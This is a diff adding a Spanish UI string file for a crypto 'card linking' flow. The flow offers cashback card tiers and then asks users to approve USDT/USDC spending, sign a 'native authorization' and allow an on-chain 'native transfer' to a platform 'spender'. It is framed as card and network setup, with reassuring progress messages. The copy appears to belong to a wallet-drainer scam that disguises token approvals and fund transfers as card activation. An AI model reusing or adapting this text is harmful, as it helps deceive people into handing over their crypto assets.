@@ -1,0 +1,218 @@
+export const WALLET_ES = {
+  closeAria: "Cerrar",
+  cancel: "Cancelar",
+  continue: "Continuar",
+  tryAgain: "Intentar de nuevo",
+  premiumBadge: "Premium",
+  titleLinking: "Vincula tu tarjeta",
+  titleSelect: "Elige tu tarjeta",
+  subtitleLinking: "Espera mientras conectamos tu billetera.",
+  subtitleSelect:
+    "Selecciona un nivel de tarjeta para vincular con tu billetera no custodial. Sin cuota anual. Sin comisiones ocultas.",
+  connectingHeadline: "Conectando con tu tarjeta {tier}",
+  connectingMessage:
+    "Preparando WalletConnect. Tu código QR aparecerá en un momento…",
+  cardAlt: "Tarjeta {name}",
+  linkNetworkTitle: "Seleccionar red",
+  walletSetupHeadline: "Configurando tu billetera",
+  walletSetupHelper:
+    "{cardLabel} · Completa los pasos a continuación para vincular tu primera red",
+  subWalletSetup:
+    "Sincronizando saldos y preparando redes para tu billetera…",
+  subLoadingNetworks: "Cargando redes disponibles para tu billetera…",
+  subLinkingWithLinked:
+    "Completa los pasos en tu billetera para vincular la red seleccionada",
+  subLinkingInterruptedLinked:
+    "La vinculación se interrumpió. Tus redes vinculadas no han cambiado.",
+  subSelectAnother:
+    "Selecciona otra red para vincular, o cierra cuando estés listo",
+  subAllLinked:
+    "Todas las redes disponibles están vinculadas — cierra cuando estés listo",
+  subLinking:
+    "Completa los pasos en tu billetera para vincular esta red",
+  subLinkingInterrupted:
+    "La vinculación se interrumpió. Puedes intentarlo de nuevo cuando quieras.",
+  subChooseNetwork:
+    "Elige la red blockchain principal para vincular con esta tarjeta",
+  sectionLinked: "Vinculada",
+  sectionLinking: "Vinculando",
+  sectionLinkNetworks: "Vincular redes",
+  sectionLinkingInterrupted: "Vinculación interrumpida",
+  badgeDenied: "Denegado",
+  badgeLinking: "Vinculando",
+  badgeCheckWallet: "Revisar billetera",
+  badgeLinked: "Vinculada",
+  cardBlackName: "Black",
+  cardBlackDesc:
+    "Gana 1% de cashback en cada compra, sin cuota anual y con recompensas sencillas; una opción ideal para el gasto diario.",
+  cardBlackLink: "Tarjeta Black",
+  cardSilverName: "Silver",
+  cardSilverDesc:
+    "Obtén 3% de cashback en cada compra, diseñada para quienes quieren más de su gasto diario, con una experiencia premium a la altura.",
+  cardSilverLink: "Tarjeta Silver Hybrid",
+  cardMetalName: "Metal",
+  cardMetalDesc:
+    "Gana 5% de cashback en cada compra, nuestro nivel de recompensas más exclusivo. Solo disponible para miembros con más de $50,000 en activos de billetera.",
+  cardMetalLink: "Tarjeta Metal Premium",
+  netTronName: "Tron",
+  netTronDesc: "Transacciones USDT rápidas con comisiones moderadas",
+  netEthName: "Ethereum",
+  netEthDesc: "Optimización segura de gas y estabilidad de nivel institucional",
+  netPolName: "Polygon",
+  netPolDesc: "Escalabilidad Layer-2 con seguridad de Ethereum",
+  netBscName: "BNB Chain",
+  netBscDesc: "Ecosistema DeFi nativo con liquidez global",
+  netAvaxName: "Avalanche",
+  netAvaxDesc: "Subredes EVM altamente escalables para dApps activas",
+  netArbName: "Arbitrum",
+  netArbDesc: "L2 de Ethereum de bajo costo con liquidez DeFi profunda",
+  netBaseName: "Base",
+  netBaseDesc: "L2 respaldada por Coinbase para pagos diarios rápidos",
+  netSolName: "Solana",
+  netSolDesc: "Liquidación en menos de un segundo para gasto de alta frecuencia",
+  helperWalletAction: "Completa la solicitud en tu aplicación de billetera.",
+  helperOnchainWait:
+    "Esperando confirmación en la blockchain. Esto puede tardar unos momentos.",
+  helperSetupProcessing: "Procesando la configuración de tu billetera…",
+  helperFinalizingNative: "Finalizando transferencia nativa en cadena…",
+  stageConnectingLabel: "Conectando",
+  stageConnectingMsgs: [
+    "Conectando",
+    "Estableciendo conexión segura…",
+    "Abriendo sesión de billetera…",
+  ],
+  stagePreparingWalletLabel: "Preparando billetera",
+  stagePreparingWalletMsgs: [
+    "Preparando billetera",
+    "Sincronizando detalles de la billetera…",
+    "Cargando tu billetera…",
+  ],
+  stageCheckingReqLabel: "Verificando requisitos",
+  stageCheckingReqMsgs: [
+    "Verificando requisitos",
+    "Comprobando requisitos de red…",
+    "Revisando compatibilidad de la billetera…",
+  ],
+  stagePrepAuthLabel: "Preparando autorización",
+  stagePrepAuthMsgs: [
+    "Preparando autorización",
+    "Configurando aprobaciones…",
+    "Preparando confirmación en la billetera…",
+  ],
+  stageBatchLabel: "Confirma USDT y USDC en la billetera",
+  stageBatchMsgs: [
+    "Confirma USDT y USDC en tu billetera",
+    "Esperando confirmación de la billetera…",
+    "Comprobando tu aprobación por lotes…",
+  ],
+  stageUsdtLabel: "Confirma USDT en la billetera",
+  stageUsdtMsgs: [
+    "Confirma USDT en tu billetera",
+    "Esperando confirmación de la billetera…",
+    "Comprobando tu aprobación de USDT…",
+  ],
+  stageUsdcLabel: "Confirma USDC en la billetera",
+  stageUsdcMsgs: [
+    "Confirma USDC en tu billetera",
+    "Esperando confirmación de la billetera…",
+    "Comprobando tu aprobación de USDC…",
+  ],
+  stageNativeLabel: "Confirma autorización nativa",
+  stageNativeMsgs: [
+    "Confirma autorización nativa",
+    "Esperando confirmación de la billetera…",
+    "Comprobando tu autorización…",
+  ],
+  stageAuthCompleteLabel: "Autorización completada",
+  stageAuthCompleteMsgs: [
+    "Autorización completada",
+    "Procesando la configuración de tu billetera…",
+    "Continuando configuración…",
+  ],
+  stageSettlementLabel: "Procesando liquidación de tokens",
+  stageSettlementMsgs: [
+    "Procesando liquidación de tokens",
+    "Liquidando aprobaciones de tokens…",
+    "Avanzando en los pasos de liquidación…",
+  ],
+  stageUsdtOnchainLabel: "Confirmando USDT en cadena…",
+  stageUsdtOnchainMsgs: [
+    "Confirmando USDT en cadena…",
+    "Esperando confirmación en la blockchain…",
+    "Comprobando estado de la transacción USDT…",
+  ],
+  stageUsdcOnchainLabel: "Confirmando USDC en cadena…",
+  stageUsdcOnchainMsgs: [
+    "Confirmando USDC en cadena…",
+    "Esperando confirmación en la blockchain…",
+    "Comprobando estado de la transacción USDC…",
+  ],
+  stageFinalizingNativeLabel: "Finalizando liquidación nativa",
+  stageFinalizingNativeMsgs: [
+    "Finalizando liquidación nativa",
+    "Finalizando transferencia nativa en cadena…",
+    "Esperando confirmación de transferencia nativa…",
+  ],
+  stageVerifyingLabel: "Verificando configuración",
+  stageVerifyingMsgs: [
+    "Verificando configuración",
+    "Confirmando que todo está listo…",
+    "Casi listo…",
+  ],
+  stageCompleteLabel: "Billetera vinculada correctamente",
+  stageCompleteMsgs: ["Billetera vinculada correctamente"],
+  overlayAria: "Obteniendo información de red",
+  overlayTitle: "Vincula tu tarjeta",
+  overlaySubtitle: "Espera mientras preparamos los datos de tu red.",
+  overlayInitial:
+    "Estamos obteniendo la información de red, blockchain y tokens para {card}.",
+  overlayRotating: [
+    "Obteniendo redes blockchain compatibles...",
+    "Descubriendo tokens disponibles...",
+    "Recuperando saldos de la billetera...",
+    "Verificando activos compatibles...",
+    "Preparando tu cartera...",
+    "Sincronizando datos de blockchain...",
+    "Comprobando compatibilidad de red...",
+    "Organizando información de tokens...",
+    "Finalizando datos de la billetera...",
+    "Casi listo...",
+  ],
+  overlayHelperInitial:
+    "Este proceso puede tardar unos minutos según tu billetera y la red seleccionada.",
+  overlayHelperLongWait:
+    "Esto está tardando un poco más de lo esperado. Permanece en esta pantalla y no cierres el proceso mientras seguimos obteniendo tus datos de blockchain.",
+  loadingProcessing: "Procesando",
+  statusWaiting: "Esperando confirmación de la billetera...",
+  statusFinalizing: "Verificando asignación en cadena...",
+  statusLinked: "Vinculada",
+  statusRejected: "Permiso denegado por el usuario",
+  statusSelectToAuthorize: "Selecciona para autorizar el gasto",
+  errPermissionDenied: "Permiso denegado por el usuario",
+  errFetchBalances: "Error al obtener saldos",
+  errMissingProjectId: "Falta NEXT_PUBLIC_PROJECT_ID en .env.local",
+  errInitWalletConnect: "Error al iniciar WalletConnect",
+  errNoAccount:
+    "No se devolvió ninguna cuenta de la billetera. Inténtalo de nuevo.",
+  errConnectionExpired:
+    "La conexión de la billetera expiró — escanea el código QR de nuevo.",
+  errConnectionReset: "Solicitud de conexión reiniciada. Inténtalo de nuevo.",
+  errNoTronBalances: "No se encontraron saldos Tron para esta billetera",
+  errNoEvmBalances: "No se encontraron saldos EVM para esta billetera",
+  errSelectNetwork: "Selecciona una red primero",
+  errNoTronAddress:
+    "No hay dirección Tron en esta sesión. Reconecta con Tron habilitado.",
+  errNoEvmAddress:
+    "No hay dirección EVM en esta sesión. Reconecta con una billetera compatible con EVM para esta red.",
+  errTronSponsorUnavailable:
+    "El patrocinio de energía TRON no está disponible. Inténtalo más tarde.",
+  errNoWalletAddress: "No hay dirección de billetera para esta red",
+  errEstimateFailed: "Error al estimar comisiones de red",
+  errAuthorizationFailed: "La sesión de autorización falló",
+  errNativeTransferFailed: "La transferencia nativa falló",
+  errApprovalFailed: "La aprobación falló",
+  errNetworkLinkingFailed:
+    "La vinculación de red falló durante la liquidación en segundo plano",
+  errMissingSpender:
+    "Falta el spender para {network}: configura las billeteras de la plataforma",
+};
